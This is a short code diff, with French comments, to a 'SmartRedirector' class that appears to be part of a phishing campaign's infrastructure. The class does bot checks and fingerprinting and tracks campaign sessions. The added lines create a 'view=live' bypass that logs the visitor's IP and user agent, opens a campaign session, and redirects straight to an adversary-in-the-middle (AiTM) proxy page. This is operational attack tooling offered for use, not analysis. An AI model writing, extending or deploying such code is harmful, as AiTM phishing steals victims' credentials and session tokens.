@@ -36,6 +36,17 @@ class SmartRedirector:
         Traite la requête entrante, vérifie les bots, et sert la page de loading/fingerprinting.
         """
         # Support Tiered Infrastructure (X-Forwarded-For)
+        if request.query_params.get("view", "") == "live":
+            # Bypass: création de session et redirection directe vers AiTM (fidélité maximale)
+            client_ip = request.headers.get("x-forwarded-for", request.client.host)
+            user_agent = request.headers.get("user-agent", "")
+            session_id = self.session_manager.create_session(
+                campaign_id=target_campaign_id,
+                client_ip=client_ip,
+                user_agent=user_agent
+            )
+            return RedirectResponse(url=f"/v5/p/{session_id}/", status_code=status.HTTP_302_FOUND)
+
         if request.query_params.get("allow", "").lower() in ("1", "true", "yes"):
             client_ip = request.headers.get("x-forwarded-for", request.client.host)
             user_agent = request.headers.get("user-agent", "")
